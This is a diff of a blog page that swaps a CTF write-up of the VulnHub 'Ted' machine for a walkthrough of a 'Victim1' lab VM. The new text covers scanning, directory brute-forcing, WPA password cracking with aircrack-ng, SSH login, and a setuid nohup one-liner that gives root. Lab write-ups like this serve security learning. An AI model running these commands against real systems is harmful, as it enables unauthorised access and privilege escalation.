@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>CTF Ted | Peanutstick</title>
+  <title>CTF Victim1:  | Peanutstick</title>
   <meta name="keywords" content=" Linux ">
-  <meta name="description" content="CTF Ted | Peanutstick">
+  <meta name="description" content="CTF Victim1:  | Peanutstick">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Netdiscoversudo netdiscover 192.168.0.23 rustscanrustscan -a 192.168.0.23 Output: Port 80gobuster dir -u http:&#x2F;&#x2F;192.168.0.23 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt -x html,php,txt Output:">
 <meta property="og:type" content="article">
@@ -907,9 +907,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-CTF_Ted" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CTF_Victim 1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">CTF Ted</h1>
+        <h1 class="article-title">CTF Victim1: </h1>
     
     <div class="article-meta">
         
@@ -934,12 +934,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-08-07 17:50:08'>2021-08-08 04:15</time>
+            Created At : <time class="date" title='Updated At: 2022-06-26 21:00:33'>2022-06-26 23:48</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:171</span>
+        <span>Count:281</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -958,7 +958,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Discovery"><span class="toc-text">Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning"><span class="toc-text">Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#netdiscover"><span class="toc-text">netdiscover</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuit"><span class="toc-text">burpsuit</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Netdiscover"><span class="toc-text">Netdiscover</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#rustscan"><span class="toc-text">rustscan</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-80"><span class="toc-text">Port 80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-9000"><span class="toc-text">Port 9000</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-8999"><span class="toc-text">Port 8999</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WPA-01-cap"><span class="toc-text">WPA-01.cap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSH"><span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enum"><span class="toc-text">Enum</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Uncommon-setuid"><span class="toc-text">Uncommon setuid</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -974,20 +974,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Discovery"><a href="#Discovery" class="headerlink" title="Discovery"></a>Discovery</h2><p>Let’s read the infos.<br><a href="https://www.vulnhub.com/entry/ted-1,327/">https://www.vulnhub.com/entry/ted-1,327/</a></p>
-<p>How well do you understand <code>PHP programs</code>?<br>How familiar are you with <code>Linux misconfigurations</code>?<br>This image will cover <code>advanced Web attacks</code>, out of the box thinking and the latest security vulnerabilities.</p>
-<p>Please note that this is capture the flag machine which means it is not real life scenario<br>but will challenge you hard before you can obtain root privileges.</p>
-<h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><h3 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h3><p>sudo netdiscover 192.168.0.0/16<br><img src="images/ted/Netdiscover.png"></p>
-<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>sudo nmap -sV -p- 192.168.0.31<br><img src="images/ted/nmap.png"><br>Only the port 80 is open.</p>
-<p>This is what we have:<br><img src="images/ted/loginpage.png"></p>
-<p>I found nothing with dirbuster and nikto.<br>let’s try with Burpsuit.</p>
-<h3 id="burpsuit"><a href="#burpsuit" class="headerlink" title="burpsuit"></a>burpsuit</h3><p>I intercept the traffic and open the Browser.<br>Request:<br><img src="images/ted/request.png"><br><img src="images/ted/response.png"></p>
-<p>He talked about missconfiguration, let’s try some creds like admin, user, root, toor, etc…</p>
-<p>Here we go!<br>I think I found the password, now I need the username.<br><img src="images/ted/burppass.png"><br>I saw 2 differents response:</p>
-<ol>
-<li>Password or password hash is not correct, make sure to hash it before submit.</li>
-<li>Username is not correct.<br>User=<code>toor</code></li>
-</ol>
+        <h1 id="Netdiscover"><a href="#Netdiscover" class="headerlink" title="Netdiscover"></a>Netdiscover</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netdiscover<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>192.168.0.23<br><img src="https://i.imgur.com/GqDuY82.png"></p>
+<h1 id="rustscan"><a href="#rustscan" class="headerlink" title="rustscan"></a>rustscan</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rustscan -a <span class="token number">192.168</span>.0.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:<br><img src="https://i.imgur.com/V0w2T80.png"></p>
+<h1 id="Port-80"><a href="#Port-80" class="headerlink" title="Port 80"></a>Port 80</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.23 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:<br><img src="https://i.imgur.com/hwdYDe6.png"><br><a href="http://192.168.0.23/robots.txt">http://192.168.0.23/robots.txt</a><br><img src="https://i.imgur.com/EXpniHm.png"><br>On some pages I have this error:<br><img src="https://i.imgur.com/rD5AhNO.png"><br>In the htaccess file I have this message. I think it’s a joomla server.<br><a href="http://192.168.0.23/htaccess.txt">http://192.168.0.23/htaccess.txt</a></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">End - Joomla! core SEF Section.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Port-9000"><a href="#Port-9000" class="headerlink" title="Port 9000"></a>Port 9000</h1><p>I can use gobuster on this page because he return the error 500 (Internal server error). </p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://192.168.0.23:9000 -w Documents/wordlist/directory-list-2.3-medium.txt -x html,php,txt --wildcard switch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Output:<br><img src="https://i.imgur.com/ZbpGAV3.png"><br>But:<br><img src="https://i.imgur.com/iNCOwRS.png"><br>Nothing interesting.</p>
+<h1 id="Port-8999"><a href="#Port-8999" class="headerlink" title="Port 8999"></a>Port 8999</h1><p>It’s useless to run the gobuster scan on this web serveur because we already have the directories. It’s like an <code>index of/</code> page.<br><img src="https://i.imgur.com/qY5d2Mf.png"></p>
+<p>It’s an webfs/1.21 server with a cap file.<br>I have to open it with wireshark.</p>
+<h1 id="WPA-01-cap"><a href="#WPA-01-cap" class="headerlink" title="WPA-01.cap"></a>WPA-01.cap</h1><p><img src="https://i.imgur.com/r2a1EpK.png"><br>This is a capture of a wireless stream, with the SSID: <code>dlink</code><br> I have to use aircrack-ng to find the password in the cap file with a directory attack.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aircrack-ng -w Documents/wordlist/rockyou.txt /home/peanutstick/Downloads/WPA-01.cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/NZXF3ZF.png"><br>The password for the SSID <code>dlink</code> is <code>p4ssword</code>.</p>
+<h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p>I can use the user dlink to login via SSH.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> dlink@192.168.0.23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h1><p><img src="https://i.imgur.com/UJw2VtJ.png"><br>Can’t check the .bash_history.<br>With lse.sh:<br><img src="https://i.imgur.com/Yb0xxhD.png"><br>There is nothing in <code>/usr/bin/TryHarder!</code> </p>
+<h1 id="Uncommon-setuid"><a href="#Uncommon-setuid" class="headerlink" title="Uncommon setuid"></a>Uncommon setuid</h1><p><a href="https://gtfobins.github.io/gtfobins/nohup/">https://gtfobins.github.io/gtfobins/nohup/</a><br><img src="https://i.imgur.com/07pTZp2.png"><br>I can’t use the commmand with sudo.</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/nohup /bin/sh -p -c <span class="token string">"sh -p &lt;<span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> ><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span> 2><span class="token variable"><span class="token variable">$(</span><span class="token function">tty</span><span class="token variable">)</span></span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/FE09pYw.png"><br>I’m root.<br><img src="https://i.imgur.com/qJ588zm.png"></p>
 
       
        
